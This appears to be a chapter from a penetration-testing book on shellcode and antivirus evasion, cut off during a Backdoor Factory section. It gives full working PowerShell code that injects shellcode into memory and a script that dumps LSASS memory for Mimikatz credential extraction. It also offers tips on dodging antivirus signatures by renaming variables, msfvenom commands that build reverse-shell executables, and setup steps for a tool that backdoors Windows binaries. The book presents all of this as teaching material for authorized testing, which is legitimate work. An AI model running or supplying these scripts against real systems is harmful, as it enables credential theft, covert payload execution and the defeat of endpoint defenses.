<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer264">
<h1 id="_idParaDest-225"><em class="italic"><a id="_idTextAnchor224"/>Chapter 12</em>: Shellcoding – Evading Antivirus</h1>
<p>Ever since the Creeper worm made its rounds among PDP-10 mainframe computers on the ARPANET in 1971, the sophistication of malware has increased radically. Without knowledge of what the future had in store, few people fully understood the potential of this newborn beast. One of the pioneers who did understand the potential of malware is Fred Cohen, the computer scientist who first defined what a computer virus is and also invented the first methodology for combating computer viruses. In his seminal 1987 paper <em class="italic">Computer Viruses – Theory and Experiments</em>, Cohen showed that the absolute and precise detection of computer viruses is an <em class="italic">undecidable problem</em> – that is, a problem that requires a yes or no judgment, but no system can possibly always give the right answer (or any answer at all). He showed the simple relationship between intersystem sharing ability and the potential for viral spread. In the years since, the sharing ability of technology has reached levels with intergenerational implications, and its full potential is likely not yet realized. It is a necessity that the abilities of computer viruses mature as well.</p>
<p>This background is the origin of what many today call the <em class="italic">cat and mouse problem</em> with computer security. We can’t radically improve one side without assisting the other side as well. In the world of penetration testing, this tells us that we can never give up hope of evading malware defense mechanisms, and when we are successful, we provide our clients with truly cutting-edge information about weaknesses in their environments. We’re going to take a look at modern methods of probing these defenses as well as how to study the lower layers of abstraction without leaving your desk.</p>
<p>In this chapter, we will cover the following:</p>
<ul>
<li>Using PowerShell and the Windows API to inject shellcode into memory</li>
<li>Using PowerShell and the Windows API to steal credentials from memory</li>
<li>Disassembly of Windows shellcode executables in Kali</li>
<li>Backdooring Windows executables with custom shellcode</li>
</ul>
<h1 id="_idParaDest-226"><a id="_idTextAnchor225"/>Technical requirements</h1>
<p>We will require the following prerequisites for testing:</p>
<ul>
<li>Kali Linux</li>
<li>Windows 10 or 7 VM</li>
</ul>
<h1 id="_idParaDest-227"><a id="_idTextAnchor226"/>Living off the land with PowerShell</h1>
<p class="author-quote">“You are like a baby. Making noise. Don’t know what to do.”</p>
<p class="author-quote">– Neytiri in <em class="italic">Avatar</em></p>
<p>So, you have some tasty shellcode, and you need it executed. You could just spit out an executable from <strong class="source-inline">msfvenom</strong>, but I don’t think there’s an antivirus product in the world that wouldn’t catch that. We’ve also worked with dynamic injection with Shellter, and we’ll look at even more parasitizing of innocent <strong class="bold">Portable Executables</strong> (<strong class="bold">PEs</strong>) later in this <a id="_idIndexMarker849"/>chapter – but again, we’re putting our instructions inside a binary, hoping to sneak past AV after it rules the program is safe. Scripts, on the other hand, aren’t machine code. They’re higher-level instructions that have to be interpreted – the actual machine code is running in the interpreter. It isn’t foolproof by any means, and the AV vendors have been on to us scripters for a while now. However, it adds an enticing layer of abstraction between the malicious intent and the actual execution.</p>
<p>Back in my day, we had to drag our toolset over to the target and get to work. Kids nowadays have PowerShell running on Windows targets out of the box, and it’s capable of interacting with the Windows API as <a id="_idIndexMarker850"/>any PE can. It’s opened up a whole world of <strong class="bold">living off the land</strong> (<strong class="bold">LotL</strong>) methods – leveraging resources that already exist on the target. This isn’t new – for example, attacking Linux boxes has long had the potential for things such as Python to already exist on the target. Windows targets can vary, from a sysadmin’s treasure trove of tools down to bare-bones embedded systems, so pulling your stuff over to it after gaining that initial foothold was a tricky business. </p>
<p>The core concept here is that the interpreter <em class="italic">already</em> exists, and any defense software knows it’s <em class="italic">not</em> malware. Don’t be fooled into thinking this means a free reign of your digital terror – as stated elsewhere in this book, the defense is <em class="italic">not</em> stupid. They are well aware of this vector, and endpoint protection products vary in their success in catching these methods. In today’s age, there has been a rapid improvement in detection even in the event that an action isn’t blocked – you may pull off a malicious PowerShell execution and think you’re golden, but a defense analyst is already reviewing your activity by the time you even begin fetching loot. You should always understand your target environment and plan accordingly. Recall from <a href="B17616_01_Final_VK_ePub.xhtml#_idTextAnchor014"><em class="italic">Chapter 1</em></a>, <em class="italic">Open Source Intelligence</em>, the value of open source intelligence and the possibility that someone working for your client has already been on vendor forums asking for help. You <a id="_idIndexMarker851"/>may already have a lead as to what your defense looks like. Are they running McAfee? Then you need to investigate your attack in an isolated McAfee environment. Maybe an attack that would be flagged by 80% of vendors would be missed in your target environment. And what if your attack <em class="italic">is</em> flagged in your test environment? Try making some changes. It’s amazing how, even in today’s age of sophisticated attacks, some vendors will initially stop a script but then allow it after a change to some variable names.</p>
<p>With all of this philosophy out of the way, let’s take a look at a couple of ways you might be able to conduct some surprising attacks with PowerShell on your target – no downloads required.</p>
<h2 id="_idParaDest-228"><a id="_idTextAnchor227"/>Injecting Shellcode into interpreter memory</h2>
<p>As some famous person once said, “Ask not what PowerShell can do for you; ask what you can do with the native <a id="_idIndexMarker852"/>Windows API.” Well, okay, no famous person said that, but it’s good advice. PowerShell is merely our bridge to the ability<a id="_idIndexMarker853"/> to import native API functions and leverage their power. In this case, we’re going to call functions inside <strong class="source-inline">kernel32.dll</strong> and <strong class="source-inline">msvcrt.dll</strong>. We need <strong class="source-inline">kernel32.dll</strong> to reserve memory for our use and start a new thread inside that reserved space; then, we use <strong class="source-inline">msvcrt.dll</strong> (the C runtime library) so that we can set each position in the reserved space with a specific character – in our case, each byte of shellcode.</p>
<p>First, we’ll define the functions with C# signatures; these will be stored in a variable called <strong class="source-inline">$signatures</strong>. Then, we use <strong class="source-inline">Add-Type</strong> to bring them into our PowerShell session. Let’s take a look:</p>
<pre class="source-code">$signatures = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); </pre>
<pre class="source-code">[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); </pre>
<pre class="source-code">[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; </pre>
<pre class="source-code">$functionImport = Add-Type -MemberDefinition $signatures -Name "Win32" -NameSpace Win32Functions -PassThru;</pre>
<p>Okay, that wasn’t too painful. We create the <strong class="source-inline">$signatures</strong> variable, and inside of it is the code that brings in the three functions we need from the two DLLs. Finally, we create an object called <strong class="source-inline">$functionImport</strong> that now contains these functions. From this point on, we merely need to interact with <strong class="source-inline">$functionImport</strong> to call those functions.</p>
<p>Now, we need to create a<a id="_idIndexMarker854"/> byte array called <strong class="source-inline">$shellcode</strong>. This will <a id="_idIndexMarker855"/>contain each byte of our payload, and we’ll use a <strong class="source-inline">For</strong> loop to reference each element in order:</p>
<pre class="source-code">[Byte[]] $shellcode = &lt;Tasty Bytes Go Here&gt;; </pre>
<pre class="source-code">$size = $shellcode.Length</pre>
<pre class="source-code">$allocSpace = $functionImport::VirtualAlloc(0, $size, 0x3000, 0x40);</pre>
<p>Note that we tell <strong class="source-inline">VirtualAlloc()</strong> the exact size of our shellcode. What about the other parameters? As you break this down (and any other code you find in your career), pay attention to how we defined this in the first place: <strong class="source-inline">IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect</strong>. This tells us that <strong class="source-inline">VirtualAlloc()</strong> will expect, in order, an address, a size, an allocation type, and the kind of memory protection to be used in the allocated space. As always, I encourage you to jump into the finer details outside of these pages.</p>
<p>Our penultimate step is to use <strong class="source-inline">memset()</strong> to set each position of our allocated space with a character from our shellcode. As you can imagine, this is best accomplished with a <strong class="source-inline">For</strong> loop. We’ll declare a counter called <strong class="source-inline">$position</strong> and, as it increments, <strong class="source-inline">memset()</strong> set the corresponding byte in the allocated space, using <strong class="source-inline">$position</strong> as an offset to <strong class="source-inline">$allocSpace</strong> to identify the exact location:</p>
<pre class="source-code">For ($position = 0; $position -le ($shellcode.Length - 1); $position++) { </pre>
<pre class="source-code">    $functionImport::memset([IntPtr]($allocSpace.ToInt32() + $position), $shellcode[$position], 1) </pre>
<pre class="source-code">};</pre>
<p>The trap is set. We merely need to execute it. As you’ll recall from when we defined <strong class="source-inline">$signatures</strong>, the third parameter passed to <strong class="source-inline">CreateThread()</strong> is the starting address – in this case, <strong class="source-inline">$allocSpace</strong>. Finally, to keep our process running while our new naughty thread runs, we use <strong class="source-inline">While ($true)</strong> to create an endless sleep. Perchance to dream?</p>
<pre class="source-code">$functionImport::CreateThread(0, 0, $allocSpace, 0, 0, 0); </pre>
<pre class="source-code">While ($true) { </pre>
<pre class="source-code">    Start-Sleep 120 </pre>
<pre class="source-code">};</pre>
<p>In all of our excitement, we<a id="_idIndexMarker856"/> almost forgot to generate the <a id="_idIndexMarker857"/>shellcode! Of course, the possibilities are endless. For our demonstration, let’s just generate a quick message-box chunk of shellcode with <strong class="source-inline">msfvenom</strong>:</p>
<div>
<div class="IMG---Figure" id="_idContainer247">
<img alt="Figure 12.1 – Generating the payload in the PowerShell byte format " height="529" src="image/Figure_12.01_B17616.jpg" width="697"/>
</div>
</div>
<p class="figure-caption">Figure 12.1 – Generating the payload in the PowerShell byte format</p>
<p>The always helpful <strong class="source-inline">msfvenom</strong><a id="_idIndexMarker858"/> spits out the result in PowerShell format and calls it <strong class="source-inline">$buf</strong>. You can copy and paste the bytes alone or just rename the <a id="_idIndexMarker859"/>variable. When I fire this off in my Windows 10 lab, the console prints each address location as the <strong class="source-inline">For</strong> loop does its work with <strong class="source-inline">memset()</strong>. At the end, we see the shellcode is successfully launched:</p>
<div>
<div class="IMG---Figure" id="_idContainer248">
<img alt="Figure 12.2 – The executed payload " height="275" src="image/Figure_12.02_B17616.jpg" width="416"/>
</div>
</div>
<p class="figure-caption">Figure 12.2 – The executed payload</p>
<p>Note that there are related functions called <strong class="source-inline">VirtualAllocEx()</strong> and <strong class="source-inline">CreateRemoteThread()</strong>. What’s the difference here? Those would accomplish the same thing but in <em class="italic">another</em> process’s memory. By using these functions here, the PowerShell interpreter is allocating <a id="_idIndexMarker860"/>the space in its own memory and starting a new thread under its own process. In keeping with our mantra, <em class="italic">the defense isn’t dumb</em>, there are many ways to catch this behavior. However, it’s<a id="_idIndexMarker861"/> extremely difficult to keep up with all of the variations, and some vendors, even today, are still relying on old methods. Keep a flexible mind!</p>
<h2 id="_idParaDest-229"><a id="_idTextAnchor228"/>Getting sassy – on-the-fly LSASS memory dumping with PowerShell</h2>
<p>Let’s roll with the theme of using PowerShell to interact with the Windows API in real time. This time, we aren’t going to <a id="_idIndexMarker862"/>inject anything; we want to attack the <strong class="bold">Local Security Authority Server Service</strong> (<strong class="bold">LSASS</strong>) using<a id="_idIndexMarker863"/> Windows’ native debugging abilities. This kind of behavior <em class="italic">should</em> be blocked, but we’ve found that in certain configurations with certain AV vendors, this still works. </p>
<p class="callout-heading">War Stories – a Real-World Attack Scenario</p>
<p class="callout">I was recently part of a red team assessment inside a predominately Windows 10 environment. One of the team members had written up a gorgeous tool that leverages a Windows native memory dumping method to dump LSASS and then invoke Mimikatz to extract credentials. It was working until, one day, the endpoint protection software got an update and started blocking it. A couple of weeks later, I was working on a host that had the popular remote control software VNC installed with a weak password and the Windows session was left unlocked. Thus, I could virtually sit down at the keyboard. I wrote out a PowerShell version of the same tool and then hosted the text as a webpage. Using a browser on the target PC, I visited the page, copied the text of the PowerShell script, pasted it inside a PowerShell session, and hit enter. It worked! I had a dump of LSASS memory, and I didn’t need to download anything.</p>
<p>This is a pretty quick write-up, and once you get used to it, you’ll be able to shave off some lines. Similar to our memory injection attack, we are leveraging native methods. In this case, we are leveraging <strong class="source-inline">MiniDumpWriteDump()</strong>, a function that creates a minidump file for us. We<a id="_idIndexMarker864"/> can specify the process to be dumped, so let’s see what happens when we try it with the LSASS process. Let’s get started:</p>
<pre class="source-code">$WinErrRep = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')</pre>
<pre class="source-code">$werNativeMethods = $WinErrRep.GetNestedType('NativeMethods', 'NonPublic')</pre>
<pre class="source-code">$Flags = [Reflection.BindingFlags] 'NonPublic, Static'</pre>
<pre class="source-code">$MiniDumpWriteDump = $werNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)</pre>
<p>So far, so good. We’re pulling in <strong class="source-inline">WindowsErrorReporting</strong>, which allows us to figure out what went wrong when something crashes. Essentially, we want to be able to investigate LSASS the same way <a id="_idIndexMarker865"/>we’d investigate an ordinary <strong class="bold">blue screen of death</strong> (<strong class="bold">BSoD</strong>) crash. Of the methods available to us, we want <strong class="source-inline">MiniDumpWriteDump()</strong>. Now, we need to define the target process and a destination for our dump file.</p>
<pre class="source-code">$MiniDumpfull = [UInt32] 2</pre>
<pre class="source-code">$lsass = Get-Process lsass</pre>
<pre class="source-code">$ProcessId = $lsass.Id</pre>
<pre class="source-code">$ProcessName = $lsass.Name</pre>
<pre class="source-code">$ProcessHandle = $lsass.Handle</pre>
<pre class="source-code">$ProcessFileName = "$Home\Desktop\pirate_booty.dmp"</pre>
<p>As you can imagine, we can target any process we please. On a recent assessment, I gained access to a SCADA device and used this very script to dump the memory from the proprietary client managing the<a id="_idIndexMarker866"/> industrial process. We declare variables for each property of <strong class="source-inline">$lsass</strong> and define the destination for our dump file – the local desktop:</p>
<pre class="source-code">$FileStream = New-Object IO.FileStream($ProcessFileName, [IO.FileMode]::Create)</pre>
<pre class="source-code">$Result = $MiniDumpWriteDump.Invoke($null, @(</pre>
<pre class="source-code">    $ProcessHandle,</pre>
<pre class="source-code">    $ProcessId,</pre>
<pre class="source-code">    $FileStream.SafeFileHandle,</pre>
<pre class="source-code">    $MiniDumpfull,</pre>
<pre class="source-code">    [IntPtr]::Zero,</pre>
<pre class="source-code">    [IntPtr]::Zero,</pre>
<pre class="source-code">    [IntPtr]::Zero))</pre>
<pre class="source-code">$FileStream.Close()</pre>
<pre class="source-code">If (-not $Result) {</pre>
<pre class="source-code">    $Exception = New-Object ComponentModel.Win32Exception</pre>
<pre class="source-code">    $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"</pre>
<pre class="source-code">    Remove-Item $ProcessFileName -ErrorAction SilentlyContinue</pre>
<pre class="source-code">    Throw $ExceptionMessage</pre>
<pre class="source-code">} Else {</pre>
<pre class="source-code">    Exit</pre>
<pre class="source-code">}</pre>
<p>Finally, the meat and potatoes of our operation. We’ve created a <strong class="source-inline">FileStream</strong> object, which we’ll reference when calling <strong class="source-inline">MiniDumpWriteDump()</strong>. It points at the desktop file location we just specified. For our convenience, we have some error handling in case we have any problems along the way, but you don’t need this part. If this works, you’ll see a beefy file called <strong class="source-inline">pirate_booty.dmp</strong> on the desktop. We’re dumping LSASS, so in theory, it should be a nice fat pile of megabytes. If you see no failures but a zero-length file, it didn’t work.</p>
<p>What’s nice about this <a id="_idIndexMarker867"/>attack is we’re merely collecting a dump file; we aren’t worried about Mimikatz being detected by antivirus because it’s back on our attack box. The only requirement at this point is getting the dump file back from the target. Once our goodies are in hand, we invoke Mimikatz and pass just two commands to force a local file analysis:</p>
<p class="source-code">mimikatz # sekurlsa::minidump &lt;file name&gt;</p>
<p class="source-code">mimikatz # sekurlsa::logonPasswords</p>
<p>Allow your eyes to glisten as you relish the treasure before you, such as Charlie when he first glimpses the golden ticket in his chocolate bar. Keep in mind, we’re seeing a dump from LSASS running in real time, so there may be cached domain credentials that we <em class="italic">won’t</em> see here. The bonus is that whatever we do find here is proven to be up to date:</p>
<div>
<div class="IMG---Figure" id="_idContainer249">
<img alt="Figure 12.3 – Extracting credentials from the LSASS dump with Mimikatz " height="280" src="image/Figure_12.03_B17616.jpg" width="693"/>
</div>
</div>
<p class="figure-caption">Figure 12.3 – Extracting credentials from the LSASS dump with Mimikatz</p>
<p>You can use this information for your lateral movement efforts – for example, dumping the hash from here into the <strong class="source-inline">PASSWORD</strong> field in the <strong class="source-inline">PSEXEC</strong> module in Metasploit. I can hear you asking at<a id="_idIndexMarker868"/> this point, “Surely it isn’t <em class="italic">this</em> easy?”</p>
<h2 id="_idParaDest-230"><a id="_idTextAnchor229"/>Staying flexible – tweaking the scripts</h2>
<p>If you typed these out verbatim and launched them inside your fresh installation of Windows 10, you probably<a id="_idIndexMarker869"/> ran into issues with Defender. The most important thing to remember about AV is that it isn’t any single product or single strategy; there are many vendors with their own proprietary methods. They can also have their own unique oversights. For example, suppose a corporation reports a false negative to their AV vendor via their contractual support agreement. It’s not uncommon for the vendor to grab the SHA256 fingerprint of the reported file and simply add it to the next round of signatures, which means you only need to change a single character in the source to get an <em class="italic">unknown</em> program. </p>
<p>Sometimes, it’s as simple as adding comments – they don’t change the behavior of the program at all, but adding them puts in a bunch of extra information. You can even change variable names:</p>
<div>
<div class="IMG---Figure" id="_idContainer250">
<img alt="Figure 12.4 – Tweaking variable names with find-and-replace in Notepad++ " height="616" src="image/Figure_12.04_B17616.jpg" width="892"/>
</div>
</div>
<p class="figure-caption">Figure 12.4 – Tweaking variable names with find-and-replace in Notepad++</p>
<p>Again, nothing about the script’s behavior is altered. Any AV product worth its salt should catch certain behaviors, regardless of how slick the calling process might be about it. But <em class="italic">should</em> is the <a id="_idIndexMarker870"/>operative word here, so it’s always worth a shot. There’s no such thing as a one-size-fits-all solution for bypassing AV; you need to design your bypass according to your target’s environment.</p>
<p>With this review of a couple of living-off-the-land techniques, let’s take a closer look at the generation of shellcode itself. </p>
<h1 id="_idParaDest-231"><a id="_idTextAnchor230"/>Understanding Metasploit shellcode delivery</h1>
<p>The shellcode that we’ve been<a id="_idIndexMarker871"/> generating with <strong class="source-inline">msfvenom</strong> is ultimately machine code that tells the processor how to, for example, bind to a local port. Once we’ve gone through a primer on low-level concepts such as the stack and heap, virtual address space, and assembly, this description of shellcode is straightforward enough. </p>
<p>The <em class="italic">art</em> of shellcoding is two key considerations: the target execution environment’s quirks and the actual delivery of the shellcode into the execution environment. The first consideration includes things such as endianness and shellcode-breaking characters; this analysis is the difference between <strong class="source-inline">0x20</strong> functioning just fine in shellcode and <strong class="source-inline">0x20</strong> being one of several characters that we have to work around. The second consideration includes scenarios just like what we covered with our heap-spraying attack, where we needed to use the <strong class="source-inline">unescape()</strong> function to parse out the bytes. Delivery of <a id="_idIndexMarker872"/>shellcode has to consider the potential for filtering mechanisms along the way. Again, shellcode is ultimately machine code, but when we’re typing up our exploit, the shellcode exists as a variable that may need to be treated as a string and then passed into a function that may or may not speak the language. Part of the art of shellcoding is the art of smuggling.</p>
<h2 id="_idParaDest-232"><a id="_idTextAnchor231"/>Encoder theory and techniques – what encoding is and isn’t</h2>
<p>One of the ways that <strong class="source-inline">msfvenom</strong> helps us to become effective smugglers is by providing encoders. Encoders transform the shellcode bytes into another form using a reversible algorithm; a decoder stub is then<a id="_idIndexMarker873"/> appended to the shellcode. Now, you’ll often see discussions about encoders and their value for bypassing AV protection. It’s wise to not get caught up in the dream of encoding your way to undetectable payloads for a couple of reasons. For one, encoders are really meant to assist with input validation concerns; they aren’t intended to bypass AV. Suppose, for example, that you’ve found an application that takes input from a user. You’ve discovered through testing that if you overflow the buffer, you can control execution; thus, you set out to actually pass shellcode through the application’s user input mechanism. If the input doesn’t allow certain characters, you’ll be stuck despite having no bounds checking. This is what encoders are really for. Secondly, and more importantly, the concept of AV evasion with encoders implies that the particular sequence of bytes representing shellcode is all the AV is looking at. As hackers, we should know better. Even simple signature-based AV scanners can detect things such as the decoder stub and other hallmarks of Metasploit, BDF, Shellter, Veil, and so on. The more advanced AV products on the market today employ far more sophisticated checks: they’re sandboxing the code to actually observe its functionality; they’re employing machine-learning heuristics; they’re gathering little chunks of information on a minute-by-minute basis from millions of endpoints in the wild, where hackers are trying their luck with a variety of methods. I’m sorry to be the one to burst this bubble, but it’s best to give up on the dream of a foolproof method for sneaking shellcode past today’s AV products. I hear someone in the back now: “<em class="italic">But there was that zero-day malware just last week that wasn’t detected by AV. I have a buddy who generated a perfectly undetectable Trojan with msfvenom and BDF, and so forth</em>.” I’m not saying AV evasion is dead – in fact, as I demonstrated in this book, it’s alive and well. </p>
<p>The emphasis is on the word <em class="italic">foolproof</em>. The takeaway from this is that you must understand your target environment as<a id="_idIndexMarker874"/> well as you can. It’s easy to get so caught up in the furious-typing hacking stuff that we forget about good old-fashioned reconnaissance.</p>
<p>But I digress. Let’s take a quick look at the <strong class="source-inline">x86/shikata_ga_nai</strong> encoder and get a feel for how it works. We won’t take a deep dive into the encoder’s inner clockwork, but this is a good opportunity to review examining the assembly of a Windows executable from within Kali.</p>
<h2 id="_idParaDest-233"><a id="_idTextAnchor232"/>Windows binary disassembly within Kali</h2>
<p>We’re going to do something<a id="_idIndexMarker875"/> very simple – generate three Windows binaries. Two of them will use the exact same parameters – we’ll run the same <strong class="source-inline">msfvenom</strong> command twice, outputting to a different file name for comparison – but with the <strong class="source-inline">x86/shikata_ga_nai</strong> encoder in play. Then, we’ll generate the same shellcode as a Windows binary but with no encoder at all. The payload is a simple reverse TCP shell pointing at our host at <strong class="source-inline">192.168.108.117</strong> on port <strong class="source-inline">1066</strong>:</p>
<p class="source-code"># msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066 --encoder x86/shikata_ga_nai --format exe &gt; shell1.exe</p>
<p class="source-code"># msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066 --encoder x86/shikata_ga_nai --format exe &gt; shell2.exe</p>
<p class="source-code"># msfvenom --payload windows/shell/reverse_tcp LHOST=192.168.108.117 LPORT=1066 --format exe &gt; shell_noencode.exe</p>
<p>Use <strong class="source-inline">sha256sum</strong> to compare the two encoded payload EXEs. Without checking out a single byte, we can see that the code is unique with each iteration:</p>
<div>
<div class="IMG---Figure" id="_idContainer251">
<img alt="Figure 12.5 – Comparing the fingerprint of our two encoded malware PEs " height="141" src="image/Figure_12.05_B17616.jpg" width="694"/>
</div>
</div>
<p class="figure-caption">Figure 12.5 – Comparing the fingerprint of our two encoded malware PEs</p>
<p>There are two indispensable tools for analyzing binaries in Kali: <strong class="source-inline">xxd</strong> and <strong class="source-inline">objdump</strong>. <strong class="source-inline">xxd</strong> is a hexadecimal dump tool; it <a id="_idIndexMarker876"/>dumps the raw contents of the binary in hexadecimal. <strong class="source-inline">objdump</strong> is more of a general-purpose tool for analyzing objects, but its abilities make it a handy disassembler. Couple the power of these tools with <strong class="source-inline">grep</strong>, and voila – you have yourself a quick and dirty method for finding specific patterns in binaries. Let’s start with a disassembly of the non-encoded Windows backdoor:</p>
<p class="source-code"># objdump -D shell_noencode.exe -M intel</p>
<p>Note that I’m rendering the instructions in Intel format; this is a Windows executable, after all. Even Windows nerds can feel at home with disassembly on Kali. This is a large output – grab some coffee and take your time exploring it. In the meantime, let’s see whether we can find the <strong class="source-inline">LHOST</strong> IP address in this file. We know the hex representation of <strong class="source-inline">192.168.108.117</strong> is <strong class="source-inline">c0.a8.6c.75</strong>, so let’s use <strong class="source-inline">grep</strong> to dig it out:</p>
<p class="source-code"># objdump -D shell_noencode.exe -M intel | grep "c0 a8 6c 75"</p>
<div>
<div class="IMG---Figure" id="_idContainer252">
<img alt="Figure 12.6 – Using objdump and grep to find specific instructions " height="73" src="image/Figure_12.06_B17616.jpg" width="617"/>
</div>
</div>
<p class="figure-caption">Figure 12.6 – Using objdump and grep to find specific instructions</p>
<p>At <strong class="source-inline">40888a</strong>, we find the instruction that pushes the target IP address onto the stack. Go ahead and try to find the same bytes in one of the encoded files. Close but no cigar. So, we know that the encoder has effectively encrypted the bytes, but we also know that two files generated with the same encoder and same parameters hash to different values. We can put hex dumps of these two binaries side by side to get an idea of what <strong class="source-inline">x86/shikata_ga_nai</strong> has done.</p>
<p>Scrolling down to the <strong class="source-inline">.text</strong> section, take a peek at the sequences common between both binaries:</p>
<div>
<div class="IMG---Figure" id="_idContainer253">
<img alt="Figure 12.7 – Looking for patterns between the two binaries " height="530" src="image/Figure_12.07_B17616.jpg" width="915"/>
</div>
</div>
<p class="figure-caption">Figure 12.7 – Looking for patterns between the two binaries</p>
<p>If you look closely at this snippet <a id="_idIndexMarker877"/>of memory, there are many byte sequences in common; I’ve highlighted just a few from a single line, starting at <strong class="source-inline">0x00001010</strong>. Now, we can go back to our disassembly and perform an analysis of what’s happening here:</p>
<div>
<div class="IMG---Figure" id="_idContainer254">
<img alt="Figure 12.8 – Analyzing the two encoded PEs with objdump and grep " height="140" src="image/Figure_12.08_B17616.jpg" width="518"/>
</div>
</div>
<p class="figure-caption">Figure 12.8 – Analyzing the two encoded PEs with objdump and grep</p>
<p>Despite the unique outputs, we see some telltale similarities. In this example, both binaries have a similar instruction at the same location in memory: <strong class="source-inline">push 0x6fd1d8</strong> and <strong class="source-inline">push 0x40d1d8</strong>. The opcode for <strong class="source-inline">push</strong> is represented by <strong class="source-inline">68</strong>, and the next two bytes, <strong class="source-inline">d8 d1</strong>, appear in the operand in reverse order. That’s right, little-endian bit order! These patterns assist us in understanding how the encoding process works, but they also help us understand<a id="_idIndexMarker878"/> how AV scanners can pick up our encoded shellcode.</p>
<p>Now that we have an idea of how to analyze our creations for a better understanding of how they work, let’s get back to practical attacks with shellcode injection.</p>
<h1 id="_idParaDest-234"><a id="_idTextAnchor233"/>Injection with Backdoor Factory</h1>
<p>In <a href="B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Exploitation with Metasploit</em>, we spent some time with Shellter, a tool for dynamic injection into Windows executables. Shellter did the heavy lifting by examining the<a id="_idIndexMarker879"/> machine code and execution flow of the selected executable and identifying ways to inject shellcode without creating telltale structures in the program; the result is a highly AV-resistant executable ready to run your payload. There are a few options out there and Shellter is one of the best, but there are a couple of limitations – namely, it’s a Windows application and can only patch 32-bit binaries. The first limitation isn’t a big problem considering how well we could run it with Wine, but depending on your perspective, this can be seen as a drawback. The second limitation isn’t a big problem either, as any 32-bit application will run just fine on 64-bit Windows, but in the face of strong defenses, we need more options, not fewer.</p>
<p>Back in <a href="B17616_07_Final_VK_ePub.xhtml#_idTextAnchor124"><em class="italic">Chapter 7</em></a>, <em class="italic">Advanced Exploitation with Metasploit</em>, we were discovering quick and easy AV evasion to sneak in our Metasploit payloads. In this discussion, we are taking a more advanced approach to understand shellcode injection into Windows binaries. This time around, we’ll be looking at <strong class="bold">Backdoor Factory</strong> (<strong class="bold">BDF</strong>).</p>
<h2 id="_idParaDest-235"><a id="_idTextAnchor234"/>Time travel with your Python installation – using PyEnv</h2>
<p>The only<a id="_idIndexMarker880"/> problem with BDF is that it hasn’t been touched for a number of years now. It’s such a useful tool that it’s still relevant; however, as it was written in an older version of Python, we have to be able to take our own Python installation into the past. As a refresher, Python 2 formally reached its end of life on January 1, 2020, so the strong recommendation is to use Python 3 going forward. Thankfully, there’s a tool that allows us to change the global Python version with just a command, so we can go from 3 to 2 and back again – it’s called <strong class="source-inline">PyEnv</strong>. Let’s get PyEnv and go back to Python 2.7.18. Get a snack – it’s a handful of commands:</p>
<p class="source-code">apt update</p>
<p class="source-code">apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git</p>
<p class="source-code">curl https://pyenv.run | bash</p>
<p>At this point, PyEnv <a id="_idIndexMarker881"/>will detect that it isn’t in the load path. It will recommend three lines that you need to add to your Z Shell configuration. Thankfully, it’s just a copy-and-paste job from there. Use <strong class="source-inline">echo</strong> to get them in place, and then restart the shell:</p>
<p class="source-code">echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.zshrc</p>
<p class="source-code">echo 'command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.zshrc</p>
<p class="source-code">echo 'eval "$(pyenv init -)"' &gt;&gt; ~/.zshrc</p>
<p class="source-code">exec $SHELL</p>
<p>Finally, we can board the time machine:</p>
<p class="source-code">pyenv install 2.7.18</p>
<p class="source-code">pyenv global 2.7.18</p>
<p>Reboot your computer and verify that you are, indeed, playing with your old toys from the past:</p>
<div>
<div class="IMG---Figure" id="_idContainer255">
<img alt="Figure 12.9 – Verifying that we’re running Python 2 " height="114" src="image/Figure_12.09_B17616.jpg" width="647"/>
</div>
</div>
<p class="figure-caption">Figure 12.9 – Verifying that we’re running Python 2</p>
<h2 id="_idParaDest-236"><a id="_idTextAnchor235"/>Installing BDF</h2>
<p>We’ll just grab a <a id="_idIndexMarker882"/>couple of dependencies for Python using pip:</p>
<p class="source-code">python -m pip install pefile</p>
<p class="source-code">python -m pip install capstone</p>
<p>At long last, we can clone into BDF with git:</p>
<p class="source-code">git clone https://github.com/secretsquirrel/the-backdoor-factory</p>
<p class="source-code">cd the-backdoor-factory</p>
<p class="source-code">./install.sh</p>
<p>Let’s get to work with our new toys.</p>
<h2 id="_idParaDest-237"><a id="_idTextAnchor236"/>Code injection fundamentals – fine-tuning with BDF</h2>
<p>I like the name <em class="italic">Backdoor Factory</em> for this tool because, in a real factory, you can see all the tiny moving parts that work together to create<a id="_idIndexMarker883"/> the final product produced by the factory. When you first fire up BDF, you may be taken aback by the options available to<a id="_idIndexMarker884"/> you at the command line. Although we won’t be covering all of these options in detail, I want to get us familiar with the tool. For our purposes in this chapter, we won’t try everything, and in a given assessment, you may not need more than just a few parameters to get the job done. However, part of the job is understanding the capability of your toolset so that you’ll effectively recognize solutions to problems. We’ll do that, but before we review BDF’s features, let’s deepen our understanding of injecting shellcode into <a id="_idIndexMarker885"/>executables (also called <strong class="bold">patching</strong>). One of the core concepts for any dynamic injector is code caves. A <strong class="bold">code cave</strong> is a block of process<a id="_idIndexMarker886"/> memory composed of just null bytes (<strong class="source-inline">0x00</strong>). We call them code caves because they’re dark, scary, and empty, bears live in them, and they’re a great place to stash our malicious code. (I lied about the bears.) These structures of nothingness are important for us because they allow us to add code without changing anything that’s already there.</p>
<p>In this example, I’ve highlighted a code cave within a Windows installer:</p>
<div>
<div class="IMG---Figure" id="_idContainer256">
